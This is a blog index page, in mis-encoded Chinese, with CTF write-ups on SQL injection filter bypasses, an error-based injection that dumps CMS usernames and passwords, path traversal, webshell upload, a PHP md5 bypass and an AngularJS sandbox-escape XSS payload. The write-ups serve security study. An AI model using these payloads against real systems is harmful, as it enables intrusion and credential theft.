<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    

    <!--Author-->
    
        <meta name="author" content="0xEaS">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="èˆ¹åˆ°æ¡¥å¤´è‡ªç„¶ç›´"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="èˆ¹åˆ°æ¡¥å¤´è‡ªç„¶ç›´"/>

    <!--Type page-->
    
        <meta property="og:type" content="website" />
    

    <!--Page Cover-->
    

    
        <meta name="twitter:card" content="summary" />
    
    
    

    <!-- Title -->
    
    <title>page - èˆ¹åˆ°æ¡¥å¤´è‡ªç„¶ç›´</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/style.css">


    <!-- Google Analytics -->
    


<meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
            <h1 id="main-title" class="title">èˆ¹åˆ°æ¡¥å¤´è‡ªç„¶ç›´</h1>
        
    </div>
</header>

        <section class="main">
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/09/SQL%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">
                SQLç»•è¿‡å§¿åŠ¿
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-09</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p><strong>é€—å·ç»•è¿‡</strong></p>
<p>åˆ©ç”¨join</p>
<p>select 1,2,3 == select * from (select 1)a join (select 2)b join (select 3)c</p>
<p>é¢˜ç›®ç»ƒä¹ ï¼šç™¾åº¦æ¯9æœˆä»½sqliï¼ˆæ˜¥ç§‹å¹³å°ï¼‰</p>
<p>*<em>select * from â€˜adminâ€™ where password=md5($pass,true)*</em></p>
<pre><code>ffifdyop

129581926211651571912466741651878684928</code></pre>
<pre><code>echo md5(&#39;ffifdyop&#39;,true);
//&#39;or&#39;6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b
select * from &#39;admin&#39; where password=md5($pass,true);
//select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6.......&#39;</code></pre>
<p><strong>[GYCTF2020]Blacklistå †å æ³¨å…¥</strong></p>
<p><img src="/images/63.png"></p>
<p>æ¯”å¼ºç½‘æ¯è¿‡æ»¤æ›´ä¸¥æ ¼ã€‚</p>
<p>å®˜æ–¹payloadï¼š</p>
<pre><code>1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</code></pre>
<p>HANDLER â€¦ OPENè¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­HANDLER â€¦ READè¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨HANDLER â€¦ CLOSEæˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­</p>
<pre><code>HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST </code></pre>
<p>é€šè¿‡HANDLER tbl_name OPENæ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚<br>é€šè¿‡HANDLER tbl_name READ FIRSTè·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡READ NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡ŒNEXTä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚<br>é€šè¿‡HANDLER tbl_name CLOSEæ¥å…³é—­æ‰“å¼€çš„å¥æŸ„ã€‚é€šè¿‡ç´¢å¼•å»æŸ¥çœ‹çš„è¯å¯ä»¥æŒ‰ç…§ä¸€å®šçš„é¡ºåºï¼Œè·å–è¡¨ä¸­çš„æ•°æ®ã€‚<br>é€šè¿‡HANDLER tbl_name READ index_name FIRSTï¼Œè·å–å¥æŸ„ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰ï¼ŒNEXTè·å–ä¸‹ä¸€è¡Œï¼ŒPREVè·å–å‰ä¸€è¡Œï¼ŒLASTè·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰</p>
<p><strong>ctfshow_web10è™šæ‹Ÿè¡¨ç»•è¿‡</strong></p>
<p>æºç </p>
<pre><code>&lt;?php
        $flag=&quot;&quot;;
        function replaceSpecialChar($strParam)&#123;
             $regex = &quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;;
             return preg_replace($regex,&quot;&quot;,$strParam);
        &#125;
        if (!$con)
        &#123;
            die(&#39;Could not connect: &#39; . mysqli_error());
        &#125;
        if(strlen($username)!=strlen(replaceSpecialChar($username)))&#123;
            die(&quot;sql inject error&quot;);
        &#125;
        if(strlen($password)!=strlen(replaceSpecialChar($password)))&#123;
            die(&quot;sql inject error&quot;);
        &#125;
        $sql=&quot;select * from user where username = &#39;$username&#39;&quot;;
        $result=mysqli_query($con,$sql);
            if(mysqli_num_rows($result)&gt;0)&#123;
                    while($row=mysqli_fetch_assoc($result))&#123;
                        if($password==$row[&#39;password&#39;])&#123;
                            echo &quot;ç™»é™†æˆåŠŸ&lt;br&gt;&quot;;
                            echo $flag;
                        &#125;

                     &#125;
            &#125;
    ?&gt;</code></pre>
<p>åˆ©ç”¨è™šæ‹Ÿè¡¨ç»•è¿‡passwordæ£€æµ‹</p>
<p>ä½¿ç”¨group byä»¥åä¼šæŒ‰ç…§passwordä¸­çš„å€¼è¿›è¡Œæ’åˆ—</p>
<p><img src="/images/84.png"></p>
<p>ï¼ˆgroup by åå¯ä»¥è·Ÿwith rollupï¼Œè¡¨ç¤ºåœ¨è¿›è¡Œåˆ†ç»„ç»Ÿè®¡çš„åŸºç¡€ä¸Šå†æ¬¡è¿›è¡Œæ±‡æ€»ç»Ÿè®¡ï¼‰</p>
<p><img src="/images/85.png"></p>
<p>ç»“æœä¸­å°†ä¼šå¤šå‡ºä¸€è¡Œï¼Œå…¶ä¸­passwordåˆ—ä¸ºnullï¼Œcountï¼ˆ*ï¼‰ä¸ºç»Ÿè®¡å’Œã€‚</p>
<p>å› ä¸ºåŠ å…¥with rollupå passwordæœ‰ä¸€è¡Œä¸ºNULLï¼Œæˆ‘ä»¬åªè¦è¾“å…¥ç©ºå¯†ç ä½¿å¾—ï¼ˆNULL==NULLï¼‰å³å¯æ»¡è¶³<code>$password==$row[&#39;password&#39;]</code>çš„é™åˆ¶æˆåŠŸç™»é™†ã€‚</p>
<p>payload</p>
<pre><code>username=admin&#39;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</code></pre>
<p><strong>ctfshow_web14  information_schema.tables ç»•è¿‡</strong></p>
<p>åå¼•å·ï¼šå®ƒæ˜¯ä¸ºäº†åŒºåˆ†MYSQLçš„ä¿ç•™å­—ä¸æ™®é€šå­—ç¬¦è€Œå¼•å…¥çš„ç¬¦å·</p>
<pre><code>ä¾‹å¦‚information_schema.tableså’Œinformation_schema.`tables`éƒ½å¯ä»¥ä½¿ç”¨</code></pre>
<p>å†åˆ©ç”¨ load_file(â€˜pathâ€™)è¯»å–æ–‡ä»¶</p>
<p><strong>æ— åˆ—åæ³¨å…¥</strong></p>
<p>select x.1 from (select 1,2,3(åˆ—åè¦åˆšå¥½å¯¹åº”) union select * from flag)x</p>
<p>joinç»•è¿‡</p>
<p>select * from (select * from users as a join users as b)c çˆ†å‡ºç¬¬ä¸€ä¸ªå­—æ®µå</p>
<p>select * from (select * from users as a join users as b using(id,id))c çˆ†å‡ºç¬¬äºŒä¸ª</p>
<p>select * from (select * from users as a join users as b using(id,username))c çˆ†ç¬¬ä¸‰ä¸ª</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/08/%E7%99%BE%E5%BA%A6%E6%9D%AF9%E6%9C%88%E4%BB%BDYeserCMS/">
                ç™¾åº¦æ¯9æœˆä»½YeserCMS
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-08</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h4 id="å…ˆå¯¹ç½‘ç«™çš„CMSæŒ‡çº¹è¿›è¡Œè¯†åˆ«"><a href="#å…ˆå¯¹ç½‘ç«™çš„CMSæŒ‡çº¹è¿›è¡Œè¯†åˆ«" class="headerlink" title="å…ˆå¯¹ç½‘ç«™çš„CMSæŒ‡çº¹è¿›è¡Œè¯†åˆ«"></a>å…ˆå¯¹ç½‘ç«™çš„CMSæŒ‡çº¹è¿›è¡Œè¯†åˆ«</h4><p><img src="/images/25.png"></p>
<h4 id="ç„¶åç™¾åº¦æœç´¢CmsEasyçš„å†å²æ¼æ´ã€‚å‘ç°å­˜åœ¨æŠ¥é”™æ³¨å…¥æ¼æ´"><a href="#ç„¶åç™¾åº¦æœç´¢CmsEasyçš„å†å²æ¼æ´ã€‚å‘ç°å­˜åœ¨æŠ¥é”™æ³¨å…¥æ¼æ´" class="headerlink" title="ç„¶åç™¾åº¦æœç´¢CmsEasyçš„å†å²æ¼æ´ã€‚å‘ç°å­˜åœ¨æŠ¥é”™æ³¨å…¥æ¼æ´"></a>ç„¶åç™¾åº¦æœç´¢CmsEasyçš„å†å²æ¼æ´ã€‚å‘ç°å­˜åœ¨æŠ¥é”™æ³¨å…¥æ¼æ´</h4><p>url/celive/live/header.php</p>
<p>POSTdata:</p>
<pre><code>xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx&#39;,(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,&#39;|&#39;,password)) from cmseasy_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt;</code></pre>
<h4 id="åˆ†ææ³¨å…¥è¯­å¥ï¼šåˆ©ç”¨çš„æ˜¯updatexmlæŠ¥é”™æ³¨å…¥"><a href="#åˆ†ææ³¨å…¥è¯­å¥ï¼šåˆ©ç”¨çš„æ˜¯updatexmlæŠ¥é”™æ³¨å…¥" class="headerlink" title="åˆ†ææ³¨å…¥è¯­å¥ï¼šåˆ©ç”¨çš„æ˜¯updatexmlæŠ¥é”™æ³¨å…¥"></a>åˆ†ææ³¨å…¥è¯­å¥ï¼šåˆ©ç”¨çš„æ˜¯updatexmlæŠ¥é”™æ³¨å…¥</h4><p>å…ˆæŸ¥è¡¨</p>
<pre><code>mid(select /**/group_concat(concat(table_name)) from information_schema.tables where table_schema=database()),1,32)</code></pre>
<p>å‘ç°æœ‰åå‡ ä¸ªè¡¨ï¼Œè€Œyesercms_userè¿™å¼ è¡¨åœ¨æœ€åï¼Œä¸çŸ¥é“å¤§ä½¬æ€ä¹ˆéå†çš„ã€‚å‘ç°yesercms_userè¡¨é‡Œæœ‰usernameï¼Œpasswordå­—æ®µã€‚æŸ¥çœ‹æ•°æ®ã€‚</p>
<pre><code>mid(select /**/group_concat(concat(username,0x3a,password)) from yesercms_user,1,32)</code></pre>
<p><img src="/images/26.png"></p>
<p>ç”¨æˆ·åæ˜¯adminï¼Œå¯†ç ç»è¿‡cmd5åŠ å¯†ï¼Œä¸å¤Ÿå…¨ï¼Œä¿®æ”¹1ï¼Œ32ï¼‰èŒƒå›´ï¼Œçœ‹ååŠæ®µã€‚</p>
<p>è§£å¯†åå¾—å¯†ç ä¸ºYeser231</p>
<h4 id="ç™»å½•åå°"><a href="#ç™»å½•åå°" class="headerlink" title="ç™»å½•åå°"></a>ç™»å½•åå°</h4><p>å¯»æ‰¾å¯ä»¥ä¸Šä¼ æ–‡ä»¶çš„ä½ç½®æˆ–å¯ä»¥è®©åå°è¯»å–æ–‡ä»¶å¹¶å›æ˜¾çš„ä½ç½®ã€‚ï¼ˆä¸è¿‡çœŸçš„éš¾æ‰¾ï¼æˆ‘æ˜¯æ²¡æ‰¾åˆ°ï¼Œæ‰¾åˆ°ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ä½ç½®å‘ç°è€ƒç‚¹ä¸åœ¨é‚£ï¼‰</p>
<p>åœ¨æ¨¡æ¿ç¼–è¾‘é‚£è¾¹éšä¾¿é€‰æ‹©ä¸€ä¸ªç¼–è¾‘ç‚¹å‡»ï¼Œç”¨burpæ‹¦æˆªä¸‹åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶åã€‚</p>
<p>POST:</p>
<p>&amp;id=#../../flag.phpåœ¨responseå¤„å°±å¯ä»¥å¾—åˆ°flagäº†ã€‚</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/06/i%E6%98%A5%E7%A7%8B-%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E7%99%BE%E8%B6%8A%E6%9D%AF%E2%80%9C%E7%A6%8F%E5%BB%BA%E7%9C%81%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BDo-you-know-upload/">
                iæ˜¥ç§‹-ç¬¬ä¸‰å±Šâ€œç™¾è¶Šæ¯â€œç¦å»ºçœé«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨å¤§èµ›Do you know upload
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-06</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p>å…ˆä¸Šä¼ å°é©¬phpæ–‡ä»¶ï¼Œæç¤ºæ–‡ä»¶ç±»å‹ä¸å¯¹ã€‚</p>
<p>ç”¨burpæˆªåŒ…ï¼Œä¿®æ”¹ç±»å‹ä¸ºimage/jpegä¸Šä¼ æˆåŠŸã€‚</p>
<p>è¿æ¥ä¸Šèœåˆ€ï¼Œå‘ç°æ²¡æœ‰flag.phpã€‚ä½†æ˜¯å¾€ä¸Šä¸€å±‚å‘ç°æœ‰ä¸ªconfig.phpæ–‡ä»¶</p>
<p><img src="/images/22.png"></p>
<p><img src="/images/23.png"></p>
<p>å‘ç°æœ‰æ•°æ®åº“è¿æ¥ç”¨æˆ·åï¼Œå¯†ç ã€‚</p>
<p>è¿æ¥ä¸Šæ•°æ®åº“</p>
<p><img src="/images/24.png"></p>
<p>å‘ç°æœ‰ä¸ªflagè¡¨</p>
<p>select flag from flag å³å¯è·å¾—flag</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/06/i%E6%98%A5%E7%A7%8B-%E7%99%BE%E5%BA%A6%E6%9D%AFCTF2017%E4%BA%8C%E6%9C%88%E5%9C%BA%E7%88%86%E7%A0%B4-3/">
                iæ˜¥ç§‹-ç™¾åº¦æ¯CTF2017äºŒæœˆåœºçˆ†ç ´-3
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-06</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <pre class=" language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">'./flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'nums'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'nums'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> 
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'time'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'whoami'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'ea'</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'time'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">120</span><span class="token operator">&lt;</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>
    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

<span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$str_rand</span> <span class="token operator">=</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str_rands</span> <span class="token operator">=</span> <span class="token variable">$str_rand</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$str_rand</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'whoami'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$value</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'nums'</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>                                                             
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'whoami'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$str_rands</span><span class="token punctuation">;</span> 
    <span class="token keyword">echo</span> <span class="token variable">$str_rands</span><span class="token punctuation">;</span>                                                                 
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'nums'</span><span class="token punctuation">]</span><span class="token operator">>=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>
   <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>ä»£ç åˆ†æï¼š</p>
<p>åˆå§‹nums=0ï¼›whoami=ea;</p>
<p>å½“whoami == $value[0].$value[1] ä¸”substr(md5($value),5,4)==0æ—¶ï¼Œnums++,whoamié‡æ–°ç”Ÿæˆï¼Œä¼šå›æ˜¾å‡ºæ–°çš„whoamiã€‚</p>
<p>å½“nums&gt;=10ï¼Œå›æ˜¾å‡ºflag.</p>
<p>#æ³¨ï¼šå½“md5ä¸€ä¸ªæ•°ç»„æ—¶ï¼Œè¿”å›nullï¼Œnull==0æˆç«‹ã€‚è€Œå‰é¢whoamiåªéœ€æ¯æ¬¡ä¿®æ”¹$value[0]å’Œ$value[1]çš„å€¼å³å¯ã€‚</p>
<p>payloadï¼š?value[0]=e&amp;value[1]=a;æ¯æ¬¡ä¿®æ”¹value[0]å’Œvalue[1]çš„å€¼å³å¯ã€‚</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/05/i%E6%98%A5%E7%A7%8BXSS-Web/">
                iæ˜¥ç§‹XSS-Web
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-05</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h4 id="å‰é¢å‡ å…³æ¯”è¾ƒå®¹æ˜“ï¼Œä¸»è¦æ˜¯æœ€åä¸€å…³ï¼Œè¿‡æ»¤äº†-lt"><a href="#å‰é¢å‡ å…³æ¯”è¾ƒå®¹æ˜“ï¼Œä¸»è¦æ˜¯æœ€åä¸€å…³ï¼Œè¿‡æ»¤äº†-lt" class="headerlink" title="å‰é¢å‡ å…³æ¯”è¾ƒå®¹æ˜“ï¼Œä¸»è¦æ˜¯æœ€åä¸€å…³ï¼Œè¿‡æ»¤äº†&lt;"></a>å‰é¢å‡ å…³æ¯”è¾ƒå®¹æ˜“ï¼Œä¸»è¦æ˜¯æœ€åä¸€å…³ï¼Œè¿‡æ»¤äº†&lt;</h4><p><img src="/images/21.png"></p>
<p>å‘ç°JSæ¡†æ¶ä½¿ç”¨çš„æ˜¯ AngularJS 1.4.6ç‰ˆæœ¬è¯¥ç‰ˆæœ¬å­˜åœ¨æ²™ç®±é€ƒé€¸ã€‚(1.6ä»¥ä¸‹çš„éƒ½å­˜åœ¨)ã€‚</p>
<h4 id="éªŒè¯XSS"><a href="#éªŒè¯XSS" class="headerlink" title="éªŒè¯XSS"></a>éªŒè¯XSS</h4><p>payloadï¼š36</p>
<p>å¦‚æœå›æ˜¾å‡º36ï¼Œåˆ™è¯´æ˜æˆåŠŸæ‰§è¡Œã€‚å­˜åœ¨XSS(ä¹Ÿå¯ä»¥æ¢å…¶ä»–è¡¨è¾¾å¼)</p>
<h4 id="æ²™ç®±é€ƒé€¸"><a href="#æ²™ç®±é€ƒé€¸" class="headerlink" title="æ²™ç®±é€ƒé€¸"></a>æ²™ç®±é€ƒé€¸</h4><pre><code>payloadï¼š&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;alert('xss')//');&#125;&#125;</code></pre>
<p>ç‰ˆæœ¬ï¼ˆ1.4.0-1.4.9)</p>
<p>æ‰§è¡ŒæˆåŠŸåï¼Œä¼šè§¦å‘alert(â€˜xssâ€™)ï¼›å¯ä»¥æ›¿æ¢ä¸ºå…¶ä»–çš„JSå‡½æ•°ã€‚</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/02/28/%E9%BB%91%E5%AE%A2%E4%B8%9B%E6%9E%97%E4%B9%8B%E6%97%85%E5%B0%8F%E6%B8%B8%E6%88%8F/">
                é»‘å®¢ä¸›æ—ä¹‹æ—…å°æ¸¸æˆ
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-02-28</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h5 id="0x01"><a href="#0x01" class="headerlink" title="#0x01"></a>#0x01</h5><p><img src="/images/17.png"></p>
<p>æ‰€ä»¥ç¬¬ä¸€å…³çš„å¯†ç ä¸ºgo9409ã€‚</p>
<h5 id="0x02"><a href="#0x02" class="headerlink" title="#0x02"></a>#0x02</h5><p><img src="/images/18.png"></p>
<p>åˆ æ‰onsubmité‡Œçš„éªŒè¯ä¸œè¥¿å°±è¡Œã€‚</p>
<h5 id="0x03"><a href="#0x03" class="headerlink" title="#0x03"></a>#0x03</h5><p><img src="/images/19.png"></p>
<p>æ‰“å¼€å­˜å‚¨æŸ¥çœ‹cookieå‘ç°æ˜¯noï¼Œæ”¹æˆyesåˆ·æ–°é¡µé¢ã€‚</p>
<h5 id="0x04"><a href="#0x04" class="headerlink" title="#0x04"></a>#0x04</h5><p>å•çº¯çš„è«å°”æ–¯å¯†ç ã€‚</p>
<p>æœ€åæ‹¼å‡ºæ¥æ˜¯IAMOK</p>
<h5 id="0x05"><a href="#0x05" class="headerlink" title="#0x05"></a>#0x05</h5><p>YmFzZTY0aXNvaw== æ˜æ˜¾æ˜¯base64ç¼–ç </p>
<p>è§£å¯†åä¸ºbase64isok</p>
<h5 id="0x06"><a href="#0x06" class="headerlink" title="#0x06"></a>#0x06</h5><p>Oracle é»˜è®¤è¿æ¥ç«¯å£ä¸º1521</p>
<p>MSSQL é»˜è®¤è¿æ¥ç«¯å£ä¸º1433</p>
<p>MySQL é»˜è®¤è¿æ¥ç«¯å£ä¸º3306</p>
<p>åŠ èµ·æ¥å°±æ˜¯ç­”æ¡ˆ</p>
<h5 id="0x07"><a href="#0x07" class="headerlink" title="#0x07"></a>#0x07</h5><p>å¯ä»¥è¿˜åŸæ¯ä¸€å¸§å†™å‡ºå¥å­</p>
<p>8b IGNORE wm UPPERCASE qne WORDS</p>
<p>å¤§å†™ç¿»è¯‘ä¸ºå¿½ç•¥å¤§å†™</p>
<p>å¯†ç ä¸º8bwmqne</p>
<h5 id="0x08"><a href="#0x08" class="headerlink" title="#0x08"></a>#0x08</h5><p>ç¤¾å·¥å­¦é¢˜ç›®ï¼Œé çŒœï¼æˆ‘æ²¡æƒ³å‡ºæ¥ã€‚</p>
<p>åœ¨ä½œè€…æ¸¸æˆé¦–é¡µæœ‰ä»‹ç»åˆ°ä»–è¿˜æœ‰ä¸ªå¼Ÿå¼Ÿå«å´å…¶æ˜Œ</p>
<p>è€Œæ¸¸æˆç½‘å€æ˜¯fj543ï¼Œæ‰€ä»¥å¯†ç ä¸ºfj573ã€‚</p>
<h5 id="0x09"><a href="#0x09" class="headerlink" title="#0x09"></a>#0x09</h5><p><img src="/images/20.png"></p>
<p>å°†è®¿é—®åœ°å€ä¿®æ”¹ä¸ºlevel=9tokenï¼ŒUser-Agent rv:83 æ”¹æˆMSIE 5.43 å°±è¡Œã€‚</p>
<h5 id="0x0A"><a href="#0x0A" class="headerlink" title="#0x0A"></a>#0x0A</h5><p>ä¸‹è½½æ–‡ä»¶ï¼Œç”¨å‹ç¼©åŒ…å¯†ç çˆ†ç ´å·¥å…·çˆ†ç ´å³å¯ã€‚</p>
<p>ä½†æ˜¯æ‰“å¼€åï¼Œé‡Œé¢çš„txtæ–‡ä»¶ä¸èƒ½æŸ¥çœ‹ï¼Œæ‰€ä»¥ç”¨typeå‘½ä»¤è¯»å–æ–‡ä»¶å†…å®¹å³å¯ã€‚</p>
